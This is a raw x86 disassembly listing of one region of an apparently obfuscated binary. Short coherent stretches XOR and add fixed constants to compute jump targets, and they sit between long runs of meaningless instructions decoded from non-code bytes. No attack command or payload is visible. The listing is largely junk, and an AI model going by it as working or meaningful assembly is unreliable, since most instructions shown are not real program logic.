  41207c:	mov    cl,0x4d
  41207e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41207f:	add    BYTE PTR [ecx],bl
  412081:	cmp    DWORD PTR [ecx],ebp
  412083:	jne    0x412050
  412085:	and    ah,ah
  412087:	mov    DWORD PTR [edi-0x1ca9cb6d],ecx
  41208d:	sub    edi,DWORD PTR [ecx+0x58]
  412090:	fbld   TBYTE PTR [ebx]
  412092:	xchg   ebp,eax
  412093:	mov    esp,edx
  412095:	in     eax,0xca
  412097:	imul   ecx,edi,0xffffffb8
  41209a:	test   al,0xb0
  41209c:	cmc    
  41209d:	ret    0x2a20
  4120a0:	xor    ax,0xb875
  4120a4:	push   es
  4120a5:	loop   0x412114
  4120a7:	and    BYTE PTR [ebx-0x22],ch
  4120aa:	xchg   ebx,eax
  4120ab:	gs ja  0x412126
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	pop    esi
  4120c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120c7:	inc    ecx
  4120c8:	sbb    dl,BYTE PTR [ebx]
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x41211e
  4120d2:	repz push eax
  4120d4:	ins    BYTE PTR es:[edi],dx
  4120d5:	push   edi
  4120d6:	out    dx,al
  4120d7:	clc    
  4120d8:	cwde   
  4120d9:	popa   
  4120da:	xchg   ebx,eax
  4120db:	test   DWORD PTR [ebx-0x42],edx
  4120de:	add    eax,0xe3cdb214
  4120e3:	ins    BYTE PTR es:[edi],dx
  4120e4:	pop    ss
  4120e5:	(bad)  
  4120e6:	cld    
  4120e7:	pop    ebp
  4120e8:	and    al,BYTE PTR [eax]
  4120ea:	dec    eax
  4120eb:	inc    edi
  4120ec:	clc    
  4120ed:	std    
  4120ee:	call   0xfa7e:0x972fd65b
  4120f5:	sar    BYTE PTR [esi-0x15],cl
  4120f8:	btc    DWORD PTR [edi],eax
  4120fb:	out    dx,al
  4120fc:	cmp    eax,0xbe50aad
  412101:	inc    edi
  412102:	scas   al,BYTE PTR es:[edi]
  412103:	jmp    0xd3dbb483
  412108:	popf   
  412109:	sbb    bh,BYTE PTR ds:0x85d13221
  41210f:	inc    ebx
  412110:	call   FWORD PTR [edx+ecx*2]
  412113:	push   ss
  412114:	fwait
  412115:	ja     0x4120a8
  412117:	cld    
  412118:	pop    esi
  412119:	inc    ebx
  41211a:	mov    bl,0x4e
  41211c:	ret    
  41211d:	stos   DWORD PTR es:[edi],eax
  41211e:	arpl   WORD PTR [esi-0x1f2075a2],bx
  412124:	mov    ds:0x4c7c1cc5,eax
  412129:	inc    ecx
  41212a:	fwait
  41212b:	call   0x9e773f13
  412130:	push   0x8e24239e
  412135:	push   edi
  412136:	xorps  xmm2,XMMWORD PTR [edx-0x22]
  41213a:	sbb    BYTE PTR [eax+0x57210bc1],al
  412140:	sub    eax,0xec9f84ce
  412145:	loop   0x4120d4
  412147:	mov    ecx,0x901b4e3
  41214c:	int    0x9b
  41214e:	sub    BYTE PTR [esi-0x27],0x97
  412152:	sbb    BYTE PTR [ecx-0x137005b6],bh
  412158:	das    
  412159:	mov    esi,0x93283606
  41215e:	inc    ebx
  41215f:	add    ebx,DWORD PTR [edx-0x514b3d6a]
  412165:	jbe    0x412196
  412167:	mov    edi,0x48766d81
  41216c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41216e:	push   ds
  41216f:	and    ecx,esi
  412171:	add    DWORD PTR [ebx+0x74],0x29
  412175:	std    
  412176:	fs inc edi
  412178:	out    dx,al
  412179:	dec    ebp
  41217a:	lds    ebx,FWORD PTR [esi]
  41217c:	add    al,0xf3
  41217e:	sbb    DWORD PTR [ebx+0x6ef6521],ebp
  412184:	pop    ds
  412185:	add    cl,dh
  412187:	(bad)  
  412188:	stos   DWORD PTR es:[edi],eax
  412189:	jns    0x41212c
  41218b:	add    DWORD PTR ds:0x7f4eeece,edx
  412191:	repnz inc esi
  412193:	adc    al,bl
  412195:	inc    esi
  412196:	pop    ebx
  412197:	adc    DWORD PTR [ecx+0x29b8dc7a],eax
  41219d:	xor    eax,0xd8b35b88
  4121a2:	mov    ds:0xc970a72f,eax
  4121a7:	out    dx,eax
  4121a8:	les    edx,FWORD PTR [eax-0x2a]
  4121ab:	cmp    edx,DWORD PTR ds:0xe96f2365
  4121b1:	pop    eax
  4121b2:	xchg   esp,eax
  4121b3:	sub    ebx,DWORD PTR [eax+eax*4]
  4121b6:	pop    edi
  4121b7:	arpl   sp,ax
  4121b9:	repz cdq 
  4121bb:	push   0xa37c1b52
  4121c0:	pop    esi
  4121c1:	cdq    
  4121c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c3:	inc    ecx
  4121c4:	pop    esi
  4121c5:	cdq    
  4121c6:	and    eax,0x3c7cc475
  4121cb:	sub    ah,BYTE PTR [ebx-0x48]
  4121ce:	or     edx,DWORD PTR [ebx]
  4121d0:	stc    
  4121d1:	mov    dl,0x8e
  4121d3:	iret   
  4121d4:	aaa    
  4121d5:	pop    ss
  4121d6:	jnp    0x412237
  4121d8:	popf   
  4121d9:	pop    esi
  4121da:	jge    0x412196
  4121dc:	add    ebx,DWORD PTR [ebx+0x7e]
  4121df:	in     eax,0xce
  4121e1:	hlt    
  4121e2:	call   0x98e0b181
  4121e7:	sbb    esi,DWORD PTR [ecx-0x78]
  4121ea:	push   ds
  4121eb:	ret    0xedc6
  4121ee:	adc    DWORD PTR [eax-0x4c],edx
  4121f1:	mov    bl,0x13
  4121f3:	mov    ss,WORD PTR [ebx-0x6e]
  4121f6:	or     BYTE PTR [ebx],0xc5
  4121f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121fa:	iret   
  4121fb:	xor    BYTE PTR [eax+edx*8+0x5e298d6f],al
  412202:	jmp    0x412200
  412204:	dec    esp
  412205:	mov    DWORD PTR [ebx+ebx*2-0x4037e627],esp
  41220c:	inc    edi
  41220d:	mov    eax,ds:0xee618040
  412212:	jne    0x412279
  412214:	pop    edi
  412215:	in     al,dx
  412216:	adc    al,0x51
  412218:	ins    DWORD PTR es:[edi],dx
  412219:	mov    ebx,0xa2a58f90
  41221e:	cmp    DWORD PTR [ebp+0x2],esp
  412221:	mov    ds:0x745402ec,eax
  412226:	enter  0x1b83,0x5c
  41222a:	jecxz  0x41229d
  41222c:	lds    esi,FWORD PTR [ebx-0x3ac1f1bc]
  412232:	popf   
  412233:	fild   WORD PTR [ebx+0x5f]
  412236:	dec    ebp
  412237:	loope  0x41223b
  412239:	(bad)  
  41223a:	mov    dl,0x4b
  41223c:	les    ecx,FWORD PTR [eax]
  41223e:	push   edi
  41223f:	rcr    esp,0x31
  412242:	ins    BYTE PTR es:[edi],dx
  412243:	mov    DWORD PTR [ebx],edx
  412245:	repnz and esi,ecx
  412248:	pop    es
  412249:	call   0xb11b2c10
  41224e:	leave  
  41224f:	inc    edi
  412250:	test   BYTE PTR [esi],0xaf
  412253:	(bad)  
  412254:	fwait
  412255:	pop    ebp
  412256:	fstp   QWORD PTR [eax-0x150a32f7]
  41225c:	mov    dh,0x62
  41225e:	inc    edi
  41225f:	xchg   edi,eax
  412260:	jecxz  0x4121ef
  412262:	xor    eax,0x6e4fc822
  412267:	mov    ebx,0x2a1c0770
  41226c:	inc    ebx
  41226d:	fwait
  41226e:	lahf   
  41226f:	outs   dx,BYTE PTR ds:[esi]
  412270:	xlat   BYTE PTR ds:[ebx]
  412271:	js     0x4122ba
  412273:	rcr    BYTE PTR [edi-0x77],1
  412276:	pop    edi
  412277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412278:	adc    DWORD PTR ds:0x100585be,ecx
  41227e:	push   ebx
  41227f:	mov    cl,0x18
  412281:	xchg   esp,eax
  412282:	mov    DWORD PTR [ebx+0xe],ecx
  412285:	push   edx
  412286:	je     0x412296
  412288:	popf   
  412289:	push   ds
  41228a:	push   es
  41228b:	mov    edi,DWORD PTR [esi+0x28533d4c]
  412291:	inc    ebx
  412292:	stos   DWORD PTR es:[edi],eax
  412293:	(bad)  
  412294:	mov    ds:0x2f41593f,al
  412299:	inc    edx
  41229a:	call   0x80d4f8e8
  41229f:	dec    ebp
  4122a0:	addr16 push ebp
  4122a2:	sub    ah,dl
  4122a4:	mov    bh,0x9e
  4122a6:	sbb    al,0x76
  4122a8:	(bad)  
  4122a9:	mov    al,0x9e
  4122ab:	xchg   DWORD PTR [eax+0x20618b44],eax
  4122b1:	mov    ah,0x0
  4122b3:	sbb    al,0x89
  4122b5:	inc    ebp
  4122b6:	or     al,0x8b
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x142213ed],ch
  4122ef:	xor    ecx,esi
  4122f1:	jle    0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x4122e0
  4122fa:	add    BYTE PTR [ebx],ah
  4122fc:	push   edx
  4122fd:	fidivr WORD PTR [eax]
  4122ff:	add    eax,0x639171ab
  412304:	mov    bh,0xe0
  412306:	fsub   QWORD PTR ds:0x8b9dcd85
  41230c:	mov    bl,0x99
  41230e:	push   eax
  41230f:	cmc    
  412310:	jmp    0xafb182ed
  412315:	add    eax,0x2cf9b2cf
  41231a:	cs xchg ebx,eax
  41231c:	rcl    DWORD PTR [edi-0x23],0x8c
  412320:	xchg   esi,eax
  412321:	hlt    
  412322:	outs   dx,DWORD PTR ds:[esi]
  412323:	sbb    ebx,esp
  412325:	std    
  412326:	inc    BYTE PTR [ebp+0x30508f5f]
  41232c:	sub    ecx,DWORD PTR [edx+0x5f]
  41232f:	ins    DWORD PTR es:[edi],dx
  412330:	stc    
  412331:	pop    edx
  412332:	jns    0x412313
  412334:	jno    0x41236a
  412336:	pop    ds
  412337:	loop   0x4123a5
  412339:	sub    al,0x29
  41233b:	or     DWORD PTR [ebx+0x6c],ebp
  41233e:	xor    ch,BYTE PTR ds:0xb1d220f5
  412344:	jae    0x4123b4
  412346:	into   
  412347:	gs push es
  412349:	test   DWORD PTR [eax],edx
  41234b:	jmp    0x314d:0x21302850
  412352:	or     eax,0x3684d22b
  412357:	xor    DWORD PTR [esi+0x54],edi
  41235a:	and    esi,DWORD PTR [ebx-0x57]
  41235d:	test   BYTE PTR [esi+0x67],bl
  412360:	test   al,0xe7
  412362:	xchg   esi,eax
  412363:	mov    ah,0xed
  412365:	retf   
  412366:	mov    ds:0x273554b1,eax
  41236b:	int    0xd3
  41236d:	lea    esi,[edi*4-0x485bb0a]
  412374:	mov    dl,bh
  412376:	pop    ebx
  412377:	and    esi,DWORD PTR [ebx-0xac06882]
  41237d:	jno    0x4123f6
  41237f:	and    WORD PTR [edx],di
  412382:	mov    dh,0x56
  412384:	adc    ch,BYTE PTR [edx]
  412386:	or     al,0x90
  412388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412389:	outs   dx,BYTE PTR ds:[esi]
  41238a:	scas   eax,DWORD PTR es:[edi]
  41238b:	mov    BYTE PTR [esi-0x7f],bh
  41238e:	or     dh,ch
  412390:	xor    cl,BYTE PTR [eax]
  412392:	inc    edi
  412393:	sub    al,0x8d
  412395:	outs   dx,DWORD PTR ds:[esi]
  412396:	test   al,0xa4
  412398:	or     BYTE PTR [edx],dl
  41239a:	sub    cl,bl
  41239c:	xor    eax,0x719d29c7
  4123a1:	mov    cl,0x7
  4123a3:	or     DWORD PTR [ebx-0xcf1b817],0x225b4bb4
  4123ad:	push   es
  4123ae:	shl    bl,1
  4123b0:	(bad)  [edi-0x7c]
  4123b3:	or     eax,0x135300cf
  4123b8:	or     eax,DWORD PTR [ecx]
  4123ba:	jge    0x412403
  4123bc:	pusha  
  4123bd:	into   
  4123be:	sbb    DWORD PTR [edi+0xa],eax
  4123c1:	cmc    
  4123c2:	jnp    0x4123d5
  4123c4:	push   ecx
  4123c5:	sbb    esi,DWORD PTR [esi]
  4123c7:	xlat   BYTE PTR ds:[ebx]
  4123c8:	adc    BYTE PTR [edx+0x70],ch
  4123cb:	cmp    BYTE PTR [ecx+0x1b657111],ah
  4123d1:	mov    esp,0x81dfaab4
  4123d6:	dec    ebp
  4123d7:	(bad)  
  4123d8:	stc    
  4123d9:	mov    ebp,0x523bc520
  4123de:	pop    ecx
  4123df:	push   0x61
  4123e1:	mov    al,0xd2
  4123e3:	lods   eax,DWORD PTR ds:[esi]
  4123e4:	pop    esi
  4123e5:	jne    0x4123e7
  4123e7:	add    ebx,esp
  4123e9:	das    
  4123ea:	mov    ebx,0xf737dab3
  4123ef:	ja     0x4123cb
  4123f1:	dec    eax
  4123f2:	repz push ebx
  4123f4:	push   0x54
  4123f6:	loop   0x4123db
  4123f8:	dec    esi
  4123f9:	cli    
  4123fa:	int3   
  4123fb:	icebp  
  4123fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123fd:	lods   eax,DWORD PTR ds:[esi]
  4123fe:	inc    ebp
  4123ff:	pop    esi
  412400:	sbb    ah,BYTE PTR [edx+0x3050910f]
  412406:	sbb    ah,al
  412408:	mov    ecx,0xa72893b7
  41240d:	jmp    0xb718dadb
  412412:	(bad)  
  412413:	popf   
  412414:	inc    edx
  412415:	dec    ebx
  412416:	mov    dh,0x3f
  412418:	pop    es
  412419:	ret    
  41241a:	xchg   ecx,eax
  41241b:	cmp    BYTE PTR [edx+ebx*8+0x22],bh
  41241f:	inc    ebp
  412420:	sbb    eax,ecx
  412422:	pop    edi
  412423:	add    al,0x98
  412425:	es xor esp,edx
  412428:	mov    ch,0x4c
  41242a:	out    dx,al
  41242b:	pop    ds
  41242c:	push   0xd9c12200
  412431:	and    al,BYTE PTR [ebx]
  412433:	rcl    BYTE PTR [edi+0x50618987],0x93
  41243a:	shl    DWORD PTR [ecx],cl
  41243c:	in     eax,0x1d
  41243e:	aaa    
  41243f:	lods   eax,DWORD PTR ds:[esi]
  412440:	mov    edi,ss
  412442:	(bad)  
  412444:	mov    cl,0xfb
  412446:	(bad)  
  412447:	or     eax,0x3d430fad
  41244c:	sar    DWORD PTR [esi-0xc9a8c12],cl
  412452:	mov    ds:0x91353201,al
  412457:	js     0x412432
  412459:	in     al,dx
  41245a:	push   esp
  41245b:	sub    ebx,edx
  41245d:	pusha  
  41245e:	(bad)  
  41245f:	repz (bad) 
  412461:	scas   eax,DWORD PTR es:[edi]
  412462:	lea    esp,[eax-0x19]
  412465:	(bad)  
  412466:	idiv   BYTE PTR [eax]
  412468:	inc    edx
  412469:	in     eax,0xc4
  41246b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41246c:	jbe    0x41243a
  41246e:	mov    ds:0x6df6bf57,eax
  412473:	cmp    al,0xdf
  412475:	es pop edx
  412477:	inc    ecx
  412478:	cmp    edi,DWORD PTR [edx+esi*8-0x5]
  41247c:	mov    eax,ds:0x3782682d
  412481:	lds    edx,FWORD PTR [edi+ecx*2+0x21]
  412485:	shl    DWORD PTR [ecx+0x73926c32],0x48
  41248c:	add    eax,ecx
  41248e:	mov    ds:0xd12f983b,eax
  412493:	mov    esp,0x97babe52
  412498:	out    0xdc,al
  41249a:	mov    bh,ch
  41249c:	dec    ecx
  41249d:	lods   eax,DWORD PTR ds:[esi]
  41249e:	pop    esp
  41249f:	pop    edi
  4124a0:	add    al,dl
  4124a2:	mov    esp,0x5ff4be7a
  4124a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a8:	fld    QWORD PTR ds:0x7f267c07
  4124ae:	mov    edi,0xf78635e7
  4124b3:	in     eax,0x95
  4124b5:	mov    ah,0xa6
  4124b7:	leave  
  4124b8:	push   ss
  4124b9:	mov    ah,BYTE PTR [esi+0x2]
  4124bc:	mov    al,0xdb
  4124be:	scas   al,BYTE PTR es:[edi]
  4124bf:	pop    eax
  4124c0:	jne    0x412448
  4124c2:	iret   
  4124c3:	add    eax,0x27fd7cd3
  4124c8:	sub    ebp,DWORD PTR ds:0x92bc62e1
  4124ce:	loop   0x412494
  4124d0:	or     bh,BYTE PTR ds:0xb9ba558b
  4124d6:	cmp    bh,al
  4124d8:	inc    edi
  4124d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124da:	pop    ebp
  4124db:	adc    eax,DWORD PTR [ebx]
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	mov    bh,0xe6
  4125a0:	cwde   
  4125a1:	inc    esp
  4125a2:	pop    ecx
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x412566
  4125ab:	xor    ebx,edx
  4125ad:	push   ebp
  4125ae:	add    ebx,esi
  4125b0:	cdq    
  4125b1:	add    bh,BYTE PTR [ecx]
  4125b3:	data16 js 0x412546
  4125b6:	pop    ecx
  4125b7:	idiv   BYTE PTR [ecx+0x18029310]
  4125bd:	jae    0x41256f
  4125bf:	inc    eax
  4125c0:	int    0xab
  4125c2:	dec    ebp
  4125c3:	xchg   esi,eax
  4125c4:	inc    eax
  4125c5:	and    ch,BYTE PTR [eax+0x44]
  4125c8:	xchg   DWORD PTR ds:0xcdf0c708,ebp
  4125ce:	mul    bh
  4125d0:	fsub   st,st(1)
  4125d2:	xchg   edi,eax
  4125d3:	pop    ecx
  4125d4:	int    0x97
  4125d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125d7:	mov    al,0x78
  4125d9:	cwde   
  4125da:	mov    ebx,0x90da5167
  4125df:	and    eax,0xcd6013d7
  4125e4:	push   ebx
  4125e5:	lock mov ch,0xfe
  4125e8:	adc    BYTE PTR [edi],bh
  4125ea:	pop    esp
  4125eb:	xchg   esp,eax
  4125ec:	sbb    eax,0xd118602b
  4125f1:	imul   bh
  4125f3:	lahf   
  4125f4:	jnp    0x4125d4
  4125f6:	pop    ebp
  4125f7:	ret    
  4125f8:	jbe    0x412646
  4125fa:	es add eax,0x25e0a078
  412600:	popf   
  412601:	enter  0xe2dd,0x95
  412605:	pop    ebx
  412606:	addr16 sub eax,0xc8537afd
  41260c:	xchg   ebp,eax
  41260d:	sub    DWORD PTR [ebx-0x36b403de],esi
  412613:	clc    
  412614:	sbb    eax,eax
  412616:	inc    eax
  412617:	inc    esp
  412618:	fcom   DWORD PTR [ecx]
  41261a:	add    BYTE PTR [edx+0x299c3939],dl
  412620:	xor    DWORD PTR [edi],edi
  412622:	(bad)  
  412623:	mov    esi,0x188a0bf2
  412628:	int3   
  412629:	icebp  
  41262a:	and    BYTE PTR [eax-0x3113eb53],ah
  412630:	test   eax,eax
  412632:	dec    ebp
  412633:	cdq    
  412634:	jne    0x412633
  412636:	scas   al,BYTE PTR es:[edi]
  412637:	cdq    
  412638:	aad    0xab
  41263a:	adc    BYTE PTR [esi+edx*4],cl
  41263d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263e:	(bad)  
  41263f:	mov    ds:0x568a9ca9,eax
  412644:	mov    bl,0x9e
  412646:	int    0xd6
  412648:	bound  ebp,QWORD PTR [esi-0x2a]
  41264b:	mov    ebp,DWORD PTR [eax]
  41264d:	les    esi,FWORD PTR [eax]
  41264f:	sub    BYTE PTR [esi],ch
  412651:	into   
  412652:	dec    edx
  412653:	nop
  412654:	and    esi,0xbad8d5aa
  41265a:	fsubr  DWORD PTR [esi]
  41265c:	daa    
  41265d:	cmp    al,BYTE PTR [esp+edx*1+0x59]
  412661:	daa    
  412662:	add    al,0x55
  412664:	int3   
  412665:	sub    eax,0xca174d18
  41266a:	loopne 0x41260f
  41266c:	fdiv   QWORD PTR [ecx-0x2]
  41266f:	mov    esp,0xb28f0b9a
  412674:	inc    esi
  412675:	cmp    BYTE PTR [eax+0x71302361],ch
  41267b:	sar    BYTE PTR [edx+ecx*1],cl
  41267e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267f:	add    esp,DWORD PTR [eax+0x1f]
  412682:	scas   al,BYTE PTR es:[edi]
  412683:	(bad)  
  412684:	into   
  412685:	iret   
  412686:	or     al,0xd9
  412688:	lahf   
  412689:	dec    eax
  41268a:	sub    eax,0xde768fb5
  41268f:	mov    ecx,DWORD PTR [ebp-0x3c308ce3]
  412695:	jg     0x412655
  412697:	mov    gs,WORD PTR [eax-0x9]
  41269a:	xchg   edx,eax
  41269b:	push   ss
  41269c:	cwde   
  41269d:	shl    edi,cl
  41269f:	adc    DWORD PTR [ebx+0x1],edi
  4126a2:	cwde   
  4126a3:	fwait
  4126a4:	int3   
  4126a5:	inc    edi
  4126a6:	aam    0xaa
  4126a8:	shl    ah,0xa5
  4126ab:	and    al,0x38
  4126ad:	sbb    BYTE PTR [ecx+0x36cc6a31],dl
  4126b3:	test   DWORD PTR [ecx-0x668dfb24],ebp
  4126b9:	cmp    bl,BYTE PTR [ecx]
  4126bb:	arpl   WORD PTR ds:0x429f0369,ax
  4126c1:	jns    0x4126a5
  4126c3:	leave  
  4126c4:	cs jno 0x412703
  4126c7:	ins    BYTE PTR es:[edi],dx
  4126c8:	in     eax,0xd1
  4126ca:	inc    edi
  4126cb:	ins    BYTE PTR es:[edi],dx
  4126cc:	fistp  WORD PTR [edi+0x63a030a2]
  4126d2:	mov    cs,WORD PTR [edi-0x23]
  4126d5:	jae    0x4126f4
  4126d7:	inc    ecx
  4126d8:	out    dx,al
  4126d9:	mov    edx,0x9cca698f
  4126de:	outs   dx,BYTE PTR ds:[esi]
  4126df:	loopne 0x412750
  4126e1:	pop    es
  4126e2:	pop    es
  4126e3:	fnstenv [ebx-0x4a80719e]
  4126e9:	jl     0x4126f5
  4126eb:	pop    ecx
  4126ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ed:	mov    edx,0x36124e2d
  4126f2:	jp     0x41275d
  4126f4:	jo     0x41267f
  4126f6:	das    
  4126f7:	out    0x30,eax
  4126f9:	cld    
  4126fa:	inc    eax
  4126fb:	jp     0x41272e
  4126fd:	mov    dh,0xf9
  4126ff:	and    al,0xab
  412701:	mov    dl,BYTE PTR [edx-0x5]
  412704:	adc    DWORD PTR [ecx-0x522e4327],ebx
  41270a:	jb     0x41276d
  41270c:	imul   esp,DWORD PTR [edi],0x4d676da3
  412712:	cmp    eax,0xdc000c20
  412717:	jbe    0x41274a
  412719:	cmp    eax,0xbb6bbb3c
  41271e:	ss int 0xf1
  412721:	pop    edi
  412722:	dec    edx
  412723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412724:	pop    ds
  412725:	push   ebx
  412726:	cmp    eax,0x57a4d2ab
  41272b:	std    
  41272c:	nop
  41272d:	add    eax,0xbd2ad789
  412732:	(bad)  
  412733:	mov    al,0x6
  412735:	les    ebx,FWORD PTR [esi]
  412737:	fdiv   QWORD PTR [ebx]
  412739:	pop    ss
  41273a:	xor    esp,DWORD PTR [ebx+esi*8+0x5d]
  41273e:	popf   
  41273f:	enter  0xae97,0x7e
  412743:	mov    al,ds:0xfc38a471
  412748:	sbb    DWORD PTR [eax],esp
  41274a:	nop
  41274b:	xchg   edx,eax
  41274c:	retf   0xf662
  41274f:	not    BYTE PTR [ecx]
  412751:	xchg   ecx,eax
  412752:	pop    es
  412753:	arpl   WORD PTR fs:0xd2c75994,sp
  41275a:	sbb    DWORD PTR [edx-0x2609faa2],0xffffff99
  412761:	jo     0x41278a
  412763:	call   0xc4582751
  412768:	shr    BYTE PTR [eax+0x7d7ac874],0x3f
  41276f:	es retf 0x74b1
  412773:	pop    esi
  412774:	push   esi
  412775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412776:	jl     0x41274c
  412778:	add    edx,edx
  41277a:	adc    eax,0x512c567e
  41277f:	jmp    0x412765
  412781:	sbb    BYTE PTR [edi+0x28a18c72],0x22
  412788:	pop    ds
  412789:	clc    
  41278a:	xchg   esi,eax
  41278b:	or     al,0xd0
  41278d:	xor    eax,ecx
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	es out 0xc1,eax
  4127a3:	and    eax,0x7e7e5f44
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x412809
  4127ad:	cmc    
  4127ae:	scas   al,BYTE PTR es:[edi]
  4127af:	sub    BYTE PTR [edi-0x5c],bh
  4127b2:	jbe    0x41279b
  4127b4:	push   ds
  4127b5:	mov    ds:0x92d005ec,eax
  4127ba:	(bad)  
  4127bb:	aas    
  4127bc:	daa    
  4127bd:	pop    eax
  4127be:	or     al,0x96
  4127c0:	js     0x4127e7
  4127c2:	pushf  
  4127c3:	shl    DWORD PTR [ebp-0x400ee73b],1
  4127c9:	aam    0xe8
  4127cb:	js     0x41279b
  4127cd:	loopne 0x412794
  4127cf:	or     al,bl
  4127d1:	je     0x41277b
  4127d3:	(bad)  
  4127d4:	js     0x4127c9
  4127d6:	mov    BYTE PTR [esi-0x3c825f20],cl
  4127dc:	sbb    al,0x22
  4127de:	addr16 add al,0xbc
  4127e1:	xchg   edx,eax
  4127e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e3:	int3   
  4127e4:	loopne 0x4127d7
  4127e6:	dec    ebp
  4127e7:	test   DWORD PTR [ecx-0x3ab06538],esp
  4127ed:	sbb    al,0xfd
  4127ef:	or     BYTE PTR [ecx-0x14],dh
  4127f2:	(bad)  
  4127f3:	stc    
  4127f4:	jp     0x412819
  4127f6:	fcomp  DWORD PTR [esi+0x5f]
  4127f9:	sbb    esp,DWORD PTR [ebx+0xfbf1c45]
  4127ff:	pop    eax
  412800:	xchg   ebp,eax
  412801:	leave  
  412802:	or     eax,0x999adcca
  412807:	pop    ecx
  412808:	and    al,0x74
  41280a:	fsub   DWORD PTR [ebp-0x6d]
  41280d:	mov    BYTE PTR [eax-0x10],cl
  412810:	jmp    0x6863:0xf786ddf6
  412817:	mov    ds:0x666815e2,eax
  41281c:	xchg   ebx,eax
